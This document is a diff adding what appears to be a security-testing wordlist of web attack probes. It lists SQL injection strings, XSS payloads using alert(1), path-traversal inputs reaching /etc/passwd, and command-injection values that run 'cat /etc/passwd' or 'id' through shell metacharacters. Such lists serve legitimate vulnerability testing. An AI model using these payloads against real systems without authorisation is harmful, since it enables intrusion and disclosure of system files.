@@ -1,0 +1,26 @@
+' OR 1=1--
+" OR ""="
+1' ORDER BY 1--
+1' UNION SELECT NULL--
+1' AND 1=1--
+' OR '1'='1
+admin'--
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+';alert(1)//
+../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+....//....//....//etc/passwd
+;cat /etc/passwd
+|cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;id
+|id
+`id`
+${IFS}
+$IFS
+%0a
+%0d%0a
